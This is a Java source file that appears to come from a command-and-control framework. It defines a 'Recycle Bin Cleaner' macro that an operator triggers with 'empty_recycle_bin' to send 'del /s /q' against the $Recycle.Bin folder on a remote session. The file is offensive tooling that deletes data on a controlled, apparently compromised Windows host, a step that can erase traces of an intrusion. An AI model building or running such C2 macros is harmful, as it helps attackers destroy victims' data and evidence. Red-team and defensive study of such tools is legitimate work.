package c2.session.macro;

import c2.HarvestProcessor;
import c2.session.IOManager;
import c2.win.WindowsCmdLineHelper;

public class RecycleBinCleanMacro extends AbstractCommandMacro{

	public static final String COMMAND = "empty_recycle_bin";
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equalsIgnoreCase(COMMAND);
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		try {
			String directory = WindowsCmdLineHelper.resolveVariableDirectory(io, sessionId, "%systemdrive%");
			String command = "del /s /q " + directory + "\\$Recycle.Bin";
			sendCommand(command, sessionId, outcome);
			String response = awaitResponse(sessionId, outcome);
			outcome.addMacroMessage("Recycle bin emptied");
		}catch(Exception ex) {
			outcome.addError("Unable to resolve system drive");
		}
		
		return outcome;
	}

	@Override
	public String getReadableName() {
		return "Recycle Bin Cleaner Macro";
	}

	@Override
	public String getInvocationCommandDescription() {
		return COMMAND;
	}

	@Override
	public String getBehaviorDescription() {
		return "This macro deletes the contents of the recycle bin";
	}

}
